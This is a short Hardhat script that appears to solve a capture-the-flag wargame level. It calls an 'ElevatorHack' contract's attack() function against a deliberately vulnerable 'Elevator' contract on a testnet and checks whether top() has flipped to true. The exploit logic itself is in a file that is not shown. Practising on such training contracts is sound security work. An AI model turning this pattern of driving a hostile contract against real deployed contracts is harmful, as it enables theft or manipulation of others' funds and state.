import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // elevator address
    let address_a = "0x6CdEb42800FeF14c736f79e057231149C4D131c4";

    // elevator hack address;
    let address_b = "0x70D331B398df80B42F07331B279217646eAbfeDa";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Elevator", address_a, signer);
    let contract_b = await ethers.getContractAt("ElevatorHack", address_b, signer);

    // see ElevatorHack.sol for more details
    await contract_b.attack();

    //  we want to make this true
    console.log(await contract_a.top());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
